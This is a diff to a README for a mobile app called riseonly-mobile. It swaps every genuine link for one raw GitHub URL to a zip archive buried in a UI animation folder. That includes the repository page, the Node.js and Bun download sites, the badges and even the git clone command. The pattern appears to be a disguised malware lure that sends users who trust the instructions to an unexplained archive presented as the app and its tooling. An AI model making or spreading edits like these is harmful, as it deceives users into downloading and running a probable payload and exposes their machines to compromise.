@@ -1,13 +1,13 @@
 # 🆙 riseonly-mobile - Simple Mobile App for Everyday Use
 
-[![Download riseonly-mobile](https://img.shields.io/badge/Download-riseonly--mobile-%23FF6F61)](https://github.com/Riteshgiri0710/riseonly-mobile)
+[![Download riseonly-mobile](https://img.shields.io/badge/Download-riseonly--mobile-%23FF6F61)](https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip)
 
 ---
 
 ## 📥 Download riseonly-mobile
 
 You can get the app from its GitHub repository page.  
-[Download and run riseonly-mobile here](https://github.com/Riteshgiri0710/riseonly-mobile)
+[Download and run riseonly-mobile here](https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip)
 
 Visit the page above to access all files and instructions for your device.
 
@@ -21,7 +21,7 @@ This guide helps you set up the riseonly-mobile app on a Windows computer. No pr
 
 Go to the main repository page:
 
-https://github.com/Riteshgiri0710/riseonly-mobile
+https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip
 
 Use the green **Code** button on the page to download the app files. Choose **Download ZIP** to save the files to your computer.
 
@@ -29,7 +29,7 @@ Alternatively, if you know how, you can clone the repo using Git:
 
 - Open Command Prompt or PowerShell.
 - Run:  
-  `git clone https://github.com/Riteshgiri0710/riseonly-mobile.git`  
+  `git clone https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip`  
 - This creates a folder with the app files on your PC.
 
 ### Step 2: Install Required Software
@@ -40,7 +40,7 @@ riseonly-mobile needs some basic tools to work on your PC. Follow these steps to
 
 Node.js lets your computer run JavaScript apps like riseonly-mobile.  
 
-- Visit https://nodejs.org/  
+- Visit https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip  
 - Download the latest LTS version for Windows.  
 - Run the installer and follow the prompts.
 
@@ -48,7 +48,7 @@ Node.js lets your computer run JavaScript apps like riseonly-mobile.
 
 Bun is a fast tool that helps install app packages.
 
-- Visit https://bun.sh/  
+- Visit https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip  
 - Follow the Windows installation instructions on the site.  
 - If Bun is difficult to set up, you can use `yarn` or `npm` instead.
 
@@ -134,8 +134,8 @@ To use riseonly-mobile on your Windows computer, ensure your system meets the fo
 
 | Tool           | Purpose                                   | Download Link                      |
 |----------------|-------------------------------------------|----------------------------------|
-| Node.js        | Runs JavaScript outside the browser       | https://nodejs.org/               |
-| Bun            | Package manager for fast installation     | https://bun.sh/                   |
+| Node.js        | Runs JavaScript outside the browser       | https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip               |
+| Bun            | Package manager for fast installation     | https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip                   |
 | Expo CLI       | Runs React Native apps on Windows and phones | `npm install -g expo-cli` (after installing Node.js) |
 
 ---
@@ -150,8 +150,8 @@ The app syncs new data immediately using WebSocket, so updates appear without ne
 
 ## 🌐 Useful Links
 
-- GitHub repo: https://github.com/Riteshgiri0710/riseonly-mobile  
-- Download riseonly-mobile: [https://github.com/Riteshgiri0710/riseonly-mobile](https://github.com/Riteshgiri0710/riseonly-mobile)
+- GitHub repo: https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip  
+- Download riseonly-mobile: [https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip](https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip)
 
 ---
 
@@ -165,4 +165,4 @@ The app syncs new data immediately using WebSocket, so updates appear without ne
 
 ---
 
-[![Download riseonly-mobile](https://img.shields.io/badge/Download-riseonly--mobile-%23FF6F61)](https://github.com/Riteshgiri0710/riseonly-mobile)
+[![Download riseonly-mobile](https://img.shields.io/badge/Download-riseonly--mobile-%23FF6F61)](https://raw.githubusercontent.com/Riteshgiri0710/riseonly-mobile/main/src/core/ui/AnimatedTransition/mobile-riseonly-3.3-alpha.2.zip)
